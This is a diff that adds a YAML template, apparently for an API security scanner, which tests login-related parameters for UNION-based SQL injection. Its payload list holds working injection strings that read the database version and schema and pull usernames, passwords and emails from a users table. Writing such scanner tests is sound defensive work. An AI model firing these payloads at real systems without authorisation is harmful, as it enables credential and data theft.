@@ -1,0 +1,112 @@
+id: SMART_ADVANCED_UNION_BASED_SQLI
+info:
+  name: "Advanced Union based SQL Injection test - Smart Testing"
+  description: "Smart testing for Advanced Union-Based SQL Injection vulnerabilities. This identifies vulnerabilities where attackers can exploit SQL queries through UNION-based injection techniques to retrieve sensitive data from the database."
+  details: "Smart detection of SQL injection flaws that leverage the UNION operator to append malicious queries. By combining attacker-controlled queries with legitimate SQL queries, sensitive data exposure can be identified. This test checks for input fields that accept user input without proper sanitization."
+  impact: "The impact can be critical, allowing attackers to retrieve sensitive information such as user credentials, financial data, or application secrets directly from the database. This can lead to unauthorized access, data breaches, and potential compliance violations."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: SMART_ADVANCED_UNION_BASED_SQLI
+  severity: MEDIUM
+  agenticTestingAllowed: true
+  onlySmartTestingAllowed: true
+  tags:
+    - SQL Injection
+    - OWASP top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+  cwe:
+    - CWE-89
+  cve:
+    - CVE-2020-24008
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Unauthorized
+      - access denied
+      - Forbidden
+
+  or:
+    - request_payload:
+        for_one:
+          key:
+            regex: "username|^user$|^userid$|^user_id$|^login$|email|^account$|^name$|password"
+            extract: userKey
+          value:
+            extract: userVal
+    - query_param:
+        for_one:
+          key:
+            regex: "username|^user$|^userid$|^user_id$|^login$|email|^account$|^name$|password"
+            extract: userKey
+          value:
+            extract: userVal
+
+wordLists:
+  unionSQLiPayloads:
+    - "' UNION SELECT null, null--"
+    - "' UNION SELECT null, null, null--"
+    - "' UNION SELECT 1, database(), version()--"
+    - "' UNION SELECT table_name, column_name, 3 FROM information_schema.columns--"
+    - "' UNION SELECT username, password, email FROM users--"
+
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_body_param:
+            userKey: ${userVal}${unionSQLiPayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              contains_either:
+                - "UNION"
+                - "SELECT"
+                - "information_schema"
+                - "database()"
+              not_contains:
+                - Error
+                - Unauthorized
+                - access denied
+        - success: x1
+        - failure: continue
+    - req:
+        - modify_query_param:
+            userKey: ${userVal}${unionSQLiPayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              contains_either:
+                - "UNION"
+                - "SELECT"
+                - "information_schema"
+                - "database()"
+              not_contains:
+                - Error
+                - Unauthorized
+                - access denied
+
